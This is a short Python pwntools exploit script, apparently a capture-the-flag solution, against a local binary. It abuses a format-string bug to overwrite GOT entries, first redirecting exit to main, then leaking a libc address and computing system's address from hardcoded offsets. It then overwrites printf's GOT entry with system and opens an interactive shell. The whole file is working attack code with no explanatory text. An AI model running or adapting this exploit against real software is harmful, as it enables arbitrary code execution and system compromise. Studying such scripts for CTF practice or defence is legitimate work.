from pwn import *


binary = ELF('./a.out')

p = process('./a.out')
#6 on is buffer
win = binary.symbols['win']
exit_got = binary.symbols['got.exit']
main = binary.symbols['main']
printf_got = binary.symbols['got.printf']

string = '%{}czz%10$n'.format(main-2)
string += ' '*(32-len(string)) + p64(exit_got)
#gdb.attach(p)


p.sendline(string)
p.readuntil('zz')
p.sendline('%37$pzz')#leak libc
p.readuntil('0x')
base = int(p.readuntil('zz')[:-2],16)-0x26cca
print hex(base)

system = base+0x48f20

print hex(system)

high = (system&0xff0000)>>16
low = (system&0xffff)

string = '%{}c%10$hhn%{}c%11$hnzz'.format(high,low-high)
string += ' '*(32-len(string)) + p64(printf_got+2)+p64(printf_got)
gdb.attach(p)
p.sendline(string)
p.readuntil('zz')



p.interactive()
